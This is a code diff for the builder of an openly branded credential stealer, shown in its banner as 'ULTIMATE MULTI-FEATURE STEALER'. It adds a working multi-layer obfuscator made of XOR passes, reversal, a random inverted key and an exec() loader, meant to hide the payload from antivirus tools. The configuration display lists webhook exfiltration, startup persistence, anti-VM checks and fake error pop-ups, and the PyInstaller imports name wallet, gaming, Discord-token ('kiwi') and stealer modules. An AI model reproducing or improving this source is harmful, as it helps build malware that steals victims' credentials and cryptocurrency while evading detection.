@@ -79,24 +79,84 @@ def check_dependencies():
     else:
         print(colorize('[+] All dependencies satisfied.', 'green'))
 
+def _x(a):
+    import marshal, zlib
+    b = compile(a, '<string>', 'exec')
+    c = marshal.dumps(b)
+    d = zlib.compress(c)
+    return base64.b64encode(d).decode()
+
 def obfuscate_code(code):
     try:
-        import py_compile
-        import marshal
-        import zlib
-        compiled = compile(code, '<string>', 'exec')
-        dumped = marshal.dumps(compiled)
-        compressed = zlib.compress(dumped)
-        encoded = base64.b64encode(compressed).decode()
+        s1 = _x(code)
+        s1b = s1.encode('latin-1')
+        x1 = bytearray(len(s1b))
+        for i in range(len(s1b)):
+            x1[i] = s1b[i] ^ ((i * 7 + 3) & 0xFF)
+        s2 = base64.b64encode(bytes(x1)).decode()
+        s3 = s2[::-1]
+        s3b = s3.encode('latin-1')
+        x2 = bytearray(len(s3b))
+        for i in range(len(s3b)):
+            x2[i] = s3b[i] ^ ((i * 11 + 5) & 0xFF)
+        s4 = base64.b64encode(bytes(x2)).decode()
+        rk = bytes([random.randint(1, 255) for _ in range(48)])
+        s4b = s4.encode('latin-1')
+        s5 = bytes(a ^ b for a, b in zip(s4b, rk * (len(s4b) // 48 + 1)))[:len(s4b)]
+        s6 = base64.b64encode(s5).decode()
+        ek = base64.b64encode(bytes(~x & 0xFF for x in rk)).decode()
         loader = (
-            'import base64,zlib,marshal,types\n'
-            '_obf_code = ' + repr(encoded) + '\n'
-            'exec(marshal.loads(zlib.decompress(base64.b64decode(_obf_code))))\n'
+            'import base64\n'
+            '_a=' + repr(s6) + '\n'
+            '_b=' + repr(ek) + '\n'
+            '_c=base64.b64decode\n'
+            '_d=bytes(~x&255 for x in _c(_b))\n'
+            '_e=_c(_a)\n'
+            '_f=bytes(a^b for a,b in zip(_e,_d*(len(_e)//48+1)))[:len(_e)]\n'
+            '_g=_c(_f).decode("latin-1")\n'
+            '_h=bytearray(len(_g))\n'
+            'for _i in range(len(_g)):\n'
+            ' _h[_i]=ord(_g[_i])^((_i*11+5)&255)\n'
+            '_j=_h.decode("latin-1")\n'
+            '_k=_j[::-1]\n'
+            '_l=_c(_k)\n'
+            '_m=bytearray(len(_l))\n'
+            'for _n in range(len(_l)):\n'
+            ' _m[_n]=_l[_n]^((_n*7+3)&255)\n'
+            '_o=_m.decode("latin-1")\n'
+            'import marshal,zlib\n'
+            'exec(marshal.loads(zlib.decompress(_c(_o))))\n'
         )
         return loader
     except Exception as e:
-        print(colorize('[!] Obfuscation failed: ', 'red') + str(e))
+        print(colorize('[!] ', 'red') + str(e))
     return code
+
+BANNER_LINES = [
+    '',
+    '  SSSSS  H   H  IIIII  V   V  EEEEE  RRRR  ',
+    '  S      H   H    I    V   V  E      R   R ',
+    '  SSS    HHHHH    I    V   V  EEE    RRRR  ',
+    '     S   H   H    I     V V   E      R  R  ',
+    '  SSSS   H   H  IIIII    V    EEEEE  R   R ',
+    '',
+    '       ULTIMATE MULTI-FEATURE STEALER      ',
+    '',
+]
+
+def make_banner():
+    bx = 58
+    lines = []
+    lines.append('+' + '-' * bx + '+')
+    for l in BANNER_LINES:
+        if len(l) > bx:
+            l = l[:bx]
+        p = bx - len(l)
+        lp = p // 2
+        rp = p - lp
+        lines.append('|' + ' ' * lp + l + ' ' * rp + '|')
+    lines.append('+' + '-' * bx + '+')
+    return '\n'.join(lines)
 
 class Builder:
     def __init__(self):
@@ -160,44 +220,26 @@ class Builder:
                 input(colorize('    Press Enter to continue...', 'dim'))
 
     def print_banner(self):
-        banner = colorize('''
-    +----------------------------------------------------------+
-    |                                                          |
-    |   SSSSS  H   H  IIIII  V   V  EEEEE  RRRR               |
-    |   S      H   H    I    V   V  E      R   R              |
-    |   SSS    HHHHH    I    V   V  EEE    RRRR               |
-    |      S   H   H    I     V V   E      R  R               |
-    |   SSSS   H   H  IIIII    V    EEEEE  R   R              |
-    |                                                          |
-    |         ULTIMATE MULTI-FEATURE STEALER                  |
-    |                                                          |
-    +----------------------------------------------------------+
-''', 'cyan')
-        print(banner)
+        b = make_banner()
+        for line in b.split('\n'):
+            print(colorize('    ', 'cyan') + colorize(line, 'cyan'))
 
     def print_config_status(self):
         print(colorize('    --------------------------------------------------', 'blue'))
         print(colorize('    CONFIGURATION', 'bold'))
         print(colorize('    --------------------------------------------------', 'blue'))
-        
         webhook_status = colorize('SET', 'green') if self.config['webhook'] else colorize('NOT SET', 'red')
         print(colorize('    Webhook    : ', 'white') + webhook_status)
-        
         obf_status = colorize('ENABLED', 'green') if self.config['obfuscation'] else colorize('DISABLED', 'red')
         print(colorize('    Obfuscation: ', 'white') + obf_status)
-        
         startup_status = colorize('ENABLED', 'green') if self.config['startup'] else colorize('DISABLED', 'red')
         print(colorize('    Startup    : ', 'white') + startup_status)
-        
         antivm_status = colorize('ENABLED', 'green') if self.config['anti_vm'] else colorize('DISABLED', 'red')
         print(colorize('    Anti-VM    : ', 'white') + antivm_status)
-        
         fake_status = colorize('ENABLED', 'green') if self.config['fake_error']['enabled'] else colorize('DISABLED', 'red')
         print(colorize('    Fake Error : ', 'white') + fake_status)
-        
         output_name = self.config['output_name'] + '.exe'
         print(colorize('    Output     : ', 'white') + colorize(output_name, 'yellow'))
-        
         print(colorize('    --------------------------------------------------', 'blue'))
 
     def set_webhook(self):
@@ -361,7 +403,6 @@ class Builder:
                 '--hidden-import', 'core.system',
                 '--hidden-import', 'core.wallets',
                 '--hidden-import', 'core.gaming',
-                '--hidden-import', 'core.social',
                 '--hidden-import', 'core.kiwi',
                 '--hidden-import', 'core.webhook',
                 '--hidden-import', 'core.stealer',
